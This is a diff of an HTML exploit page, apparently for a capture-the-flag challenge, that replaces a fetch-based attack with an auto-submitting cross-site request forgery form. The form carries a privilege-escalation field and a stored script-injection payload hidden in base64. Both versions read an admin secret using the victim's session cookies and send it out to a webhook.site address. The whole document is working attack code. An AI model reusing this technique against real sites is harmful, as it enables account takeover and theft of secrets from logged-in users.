@@ -1,22 +1,12 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Loading...</h1>
+<form id="f" method="POST" action="http://ctf.learn-it.org:39951/api/update-profile" enctype="text/plain" target="_blank">
+<input name='{"isAdmin":true,"avatar":{"skin":"</svg><img src=x onerror=eval(atob(&#39;ZmV0Y2goJy9hcGkvYWRtaW4vc2VjcmV0Jyx7Y3JlZGVudGlhbHM6J2luY2x1ZGUnfSkudGhlbihyPT5yLmpzb24oKSkudGhlbihkPT5sb2NhdGlvbj0naHR0cHM6Ly93ZWJob29rLnNpdGUvMjQwNzc5YWMtYjM4Mi00ZGVhLWFiNjYtZTJiNTMxNTU5YzIzP2ZsYWc9JytkLmZsYWcp&#39;))>"},"x":"' value='"}'>
+</form>
 <script>
-fetch('http://ctf.learn-it.org:39951/api/update-profile', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/json'},
-  credentials: 'include',
-  body: JSON.stringify({isAdmin: true})
-})
-.then(() => fetch('http://ctf.learn-it.org:39951/api/admin/secret', {credentials: 'include'}))
-.then(r => r.json())
-.then(d => {
-  window.location = 'https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?flag=' + encodeURIComponent(d.flag);
-})
-.catch(e => {
-  window.location = 'https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?error=' + encodeURIComponent(e.message);
-});
+document.getElementById('f').submit();
+setTimeout(function(){location='http://ctf.learn-it.org:39951/dashboard';},1000);
 </script>
 </body>
 </html>
